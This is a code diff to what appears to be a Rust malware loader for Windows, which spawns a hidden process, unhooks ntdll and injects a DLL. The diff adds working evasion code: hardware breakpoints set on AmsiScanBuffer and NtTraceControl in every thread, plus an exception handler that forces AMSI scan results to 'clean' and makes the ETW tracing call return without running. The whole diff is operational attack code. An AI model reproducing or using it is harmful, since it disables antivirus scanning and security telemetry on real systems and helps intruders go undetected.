@@ -27,9 +27,9 @@ use windows_sys::Win32::{
 };
 
 use winapi::{
-    
+    vc::excpt::{EXCEPTION_CONTINUE_EXECUTION,EXCEPTION_CONTINUE_SEARCH},
     shared::{
-        ntdef::{HANDLE, PVOID, OBJECT_ATTRIBUTES, NT_SUCCESS, UNICODE_STRING, LIST_ENTRY, SHORT, WCHAR},
+        ntdef::{HANDLE, PVOID, OBJECT_ATTRIBUTES, NT_SUCCESS, UNICODE_STRING, LIST_ENTRY, SHORT, WCHAR,LONG},
         basetsd::{SIZE_T},
         minwindef::{ULONG,DWORD},
         ntstatus::STATUS_SUCCESS,
@@ -39,8 +39,11 @@ use winapi::{
         winnt::{
                 THREAD_ALL_ACCESS, CONTEXT, CONTEXT_ALL, IMAGE_NT_HEADERS, IMAGE_SECTION_HEADER,
                 IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_EXPORT_DIRECTORY,IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_SIGNATURE, 
-                IMAGE_DOS_SIGNATURE, LARGE_INTEGER, MEM_RELEASE, PAGE_EXECUTE_READWRITE, MEMORY_BASIC_INFORMATION
+                IMAGE_DOS_SIGNATURE, LARGE_INTEGER, MEM_RELEASE, PAGE_EXECUTE_READWRITE, MEMORY_BASIC_INFORMATION, EXCEPTION_POINTERS,
+                THREAD_GET_CONTEXT, THREAD_SET_CONTEXT
             },
+        errhandlingapi::AddVectoredExceptionHandler,
+        minwinbase::EXCEPTION_SINGLE_STEP,
     },
 };
 
@@ -135,6 +138,10 @@ const KEY: u8 = 0x42;
 const STARTF_USESHOWWINDOW: DWORD = 0x00000001;
 const SW_HIDE: c_int = 0;
 const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x10000000000;
+const S_OK: i32 = 0;
+const AMSI_RESULT_CLEAN: i32 = 0;
+static mut AMSI_SCAN_BUFFER_PTR: Option<*mut u8> = None;
+static mut NT_TRACE_CONTROL_PTR: Option<*mut u8> = None;
 
 
 #[repr(C)]
@@ -213,12 +220,19 @@ fn main() {
     spawn_process(explorer_pid as u64, &mut process);
 
     println!("{} {} {} {}", lc!("[+] Successfully Spwand Process"), process.process_name, lc!("With PID:"), process.process_id);
-
-    //std::thread::sleep(std::time::Duration::from_secs(3));
+    encrypted_sleep(3000);
+    match setup_bypass() {
+        Ok(_) => {
+            println!("[+] HWBP as been applied to all Treads.");
+        },
+        Err(err_msg) => {
+            println!("Error during verification: {}", err_msg);
+        }
+    }
     unhook_ntdll(&mut process, false);
+    encrypted_sleep(3000);
     unhook_ntdll(&mut process, true);
-
-    
+    encrypted_sleep(3000);
     // Inject a legitimate Microsoft signed DLL (e.g. amsi.dll)
     inject_dll(&mut process);
     
@@ -2065,3 +2079,273 @@ fn encrypted_sleep(ms: u64) {
     unsafe{syscall!("NtClose",encrypt_thread_handle)};
 }
 
+
+fn set_bits(dw: u64, low_bit: i32, bits: i32, new_value: u64) -> u64 {
+    let mask = (1 << bits) - 1;
+    (dw & !(mask << low_bit)) | (new_value << low_bit)
+}
+
+fn clear_breakpoint(ctx: &mut CONTEXT, index: i32) {
+    match index {
+        0 => ctx.Dr0 = 0,
+        1 => ctx.Dr1 = 0,
+        2 => ctx.Dr2 = 0,
+        3 => ctx.Dr3 = 0,
+        _ => {}
+    }
+    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 0);
+    ctx.Dr6 = 0;
+    ctx.EFlags = 0;
+}
+
+fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: i32) {
+    match index {
+        0 => ctx.Dr0 = address as u64,
+        1 => ctx.Dr1 = address as u64,
+        2 => ctx.Dr2 = address as u64,
+        3 => ctx.Dr3 = address as u64,
+        _ => {}
+    }
+    ctx.Dr7 = set_bits(ctx.Dr7, 16, 16, 0);
+    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 1);
+    ctx.Dr6 = 0;
+}
+
+fn get_arg(ctx: &CONTEXT, index: i32) -> usize {
+    match index {
+        0 => ctx.Rcx as usize,
+        1 => ctx.Rdx as usize,
+        2 => ctx.R8 as usize,
+        3 => ctx.R9 as usize,
+        _ => unsafe { *((ctx.Rsp as *const u64).offset((index + 1) as isize) as *const usize) }
+    }
+}
+
+fn get_return_address(ctx: &CONTEXT) -> usize {
+    unsafe { *((ctx.Rsp as *const u64) as *const usize) }
+}
+
+fn set_result(ctx: &mut CONTEXT, result: usize) {
+    ctx.Rax = result as u64;
+}
+
+fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
+    ctx.Rsp += amount as u64;
+}
+
+fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
+    ctx.Rip = new_ip as u64;
+}
+
+unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> LONG {
+    unsafe {
+        let context = &mut *(*exceptions).ContextRecord;
+        let exception_code = (*(*exceptions).ExceptionRecord).ExceptionCode;
+        let exception_address = (*(*exceptions).ExceptionRecord).ExceptionAddress as usize;
+
+        if exception_code == EXCEPTION_SINGLE_STEP {
+            if let Some(amsi_address) = AMSI_SCAN_BUFFER_PTR {
+                if exception_address == amsi_address as usize {
+                    println!("AMSI Bypass invoked at address: {:#X}", exception_address);
+
+                    let return_address = get_return_address(context);
+                    let scan_result_ptr = get_arg(context, 5) as *mut i32;
+                    *scan_result_ptr = AMSI_RESULT_CLEAN;
+
+                    set_ip(context, return_address);
+                    adjust_stack_pointer(context, std::mem::size_of::<*mut u8>() as i32);
+                    set_result(context, S_OK as usize);
+
+                    clear_breakpoint(context, 0);
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
+            }
+
+            if let Some(nt_trace_address) = NT_TRACE_CONTROL_PTR {
+                if exception_address == nt_trace_address as usize {
+                    println!("NtTraceControl Bypass invoked at address: {:#X}", exception_address);
+
+                    // Use find_gadget logic to modify RIP
+                    if let Some(new_rip) = find_gadget(exception_address, b"\xc3", 1, 500) {
+                        context.Rip = new_rip as u64;
+                    }
+
+                    clear_breakpoint(context, 1);
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
+            }
+        }
+
+        EXCEPTION_CONTINUE_SEARCH
+    }
+}
+
+
+// Function to find a gadget (a specific byte pattern) in memory
+fn find_gadget(function: usize, stub: &[u8], size: usize, dist: usize) -> Option<usize> {
+    for i in 0..dist {
+        unsafe {
+            let ptr = function + i;
+            if std::slice::from_raw_parts(ptr as *const u8, size) == stub {
+                return Some(ptr);
+            }
+        }
+    }
+    None
+}
+
+
+
+fn setup_bypass() -> Result<*mut c_void, String> {
+    let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
+    thread_ctx.ContextFlags = CONTEXT_ALL;
+
+
+    // Example of handling Result with match
+    let process_id = GetCurrentProcessId().map_err(|e| format!("Failed to get process ID: {}", e))?;
+    unsafe {
+        // Check if amsi.dll is loaded
+        if AMSI_SCAN_BUFFER_PTR.is_none() {
+            let amsi_module_handle = match get_module_base_by_name("amsi.dll", process_id as u32) {
+                Ok(handle) => handle,
+                Err(_) => {
+                    // Here you can provide a fallback value or alternative logic
+                    // For example, setting the handle to a default value or `null`
+                    null_mut() // or null_mut() for a null pointer, depending on your requirements
+                }
+            };
+
+            if amsi_module_handle.is_null() {
+                println!("[!] amsi.dll is not loaded, skipping AMSI setup");                
+            } else{
+                let amsi_function_ptr = get_proc_address(amsi_module_handle, "AmsiScanBuffer")
+                    .expect(obfstr!("Failed to get AmsiScanBuffer address"));
+
+                AMSI_SCAN_BUFFER_PTR = Some(amsi_function_ptr as *mut u8);
+            }
+
+        }
+
+        if NT_TRACE_CONTROL_PTR.is_none() {
+            let ntdll_module_handle = get_module_base_by_name("ntdll.dll", process_id as u32)
+                .expect(obfstr!("Failed to get ntdll.dll base"));
+
+            let ntdll_function_ptr = get_proc_address(ntdll_module_handle, "NtTraceControl")
+                .expect(obfstr!("Failed to get NtTraceControl address"));
+
+            NT_TRACE_CONTROL_PTR = Some(ntdll_function_ptr as *mut u8);
+        }
+    }
+
+    let h_ex_handler = unsafe {
+        AddVectoredExceptionHandler(1, Some(exception_handler))
+    };
+
+
+    // Retrieve handles to all threads in the process
+    let thread_handles = get_threads_handle(process_id as u32)
+        .map_err(|e| format!("Failed to get thread handles: {}", e))?;
+
+    if thread_handles.is_empty() {
+        return Err("No thread handles found".to_string());
+    }
+
+    for thread_handle in thread_handles {
+        let status = unsafe { syscall!("NtGetContextThread", thread_handle, &mut thread_ctx) };
+        if !NT_SUCCESS(status) {
+            eprintln!("Failed to get thread context for handle {:?}: {:#X}", thread_handle, status);
+            // Optionally continue to the next handle instead of returning an error
+            continue;
+        }
+
+        // Set breakpoints for both AmsiScanBuffer and NtTraceControl
+        unsafe {
+            if let Some(amsi_ptr) = AMSI_SCAN_BUFFER_PTR {
+                enable_breakpoint(&mut thread_ctx, amsi_ptr, 0);
+            }
+            if let Some(nt_trace_ptr) = NT_TRACE_CONTROL_PTR {
+                enable_breakpoint(&mut thread_ctx, nt_trace_ptr, 1);
+            }
+        }
+
+        if unsafe { syscall!("NtSetContextThread", thread_handle, &mut thread_ctx) } != 0 {
+            eprintln!("Failed to set thread context for handle {:?}", thread_handle);
+            // Optionally continue to the next handle instead of returning an error
+            continue;
+        }
+        unsafe { syscall!("NtClose", thread_handle) };
+    }
+
+    Ok(h_ex_handler)
+}
+
+
+fn get_threads_handle(process_id: u32) -> Result<Vec<HANDLE>, String> {
+    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
+    let mut return_length: ULONG = 0;
+
+    let status = unsafe {
+        syscall!(
+            "NtQuerySystemInformation",
+            SystemProcessInformation,
+            buffer.as_mut_ptr() as *mut c_void,
+            buffer.capacity() as ULONG,
+            &mut return_length
+        )
+    };
+
+    if !NT_SUCCESS(status) {
+        return Err("Failed to call NtQuerySystemInformation".to_owned());
+    }
+
+    unsafe {
+        buffer.set_len(return_length as usize);
+    }
+
+    let mut offset: usize = 0;
+    let mut thread_handles: Vec<HANDLE> = Vec::new();
+
+    while offset < buffer.len() {
+        let process_info: &SYSTEM_PROCESS_INFORMATION = unsafe { &*(buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION) };
+
+        if process_info.UniqueProcessId == process_id as PVOID {
+            let thread_array_base = (process_info as *const _ as usize) + std::mem::size_of::<SYSTEM_PROCESS_INFORMATION>() - std::mem::size_of::<SYSTEM_THREAD_INFORMATION>();
+
+            for i in 0..process_info.NumberOfThreads as usize {
+                let thread_info_ptr = (thread_array_base + i * std::mem::size_of::<SYSTEM_THREAD_INFORMATION>()) as *const SYSTEM_THREAD_INFORMATION;
+                let thread_info = unsafe { &*thread_info_ptr };
+
+                let mut thread_handle: HANDLE = null_mut();
+                let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+                let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed() };
+                client_id.UniqueThread = thread_info.ClientId.UniqueThread;
+
+
+                let status = unsafe {
+                    syscall!(
+                        "NtOpenThread",
+                        &mut thread_handle,
+                        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
+                        &mut object_attrs,
+                        &mut client_id
+                    )
+                };
+
+                if NT_SUCCESS(status) {
+                    thread_handles.push(thread_handle);
+                }
+            }
+        }
+
+        if process_info.NextEntryOffset == 0 {
+            break;
+        }
+        offset += process_info.NextEntryOffset as usize;
+    }
+
+    if thread_handles.is_empty() {
+        return Err("Failed to find any threads".to_owned());
+    }
+
+    Ok(thread_handles)
+}
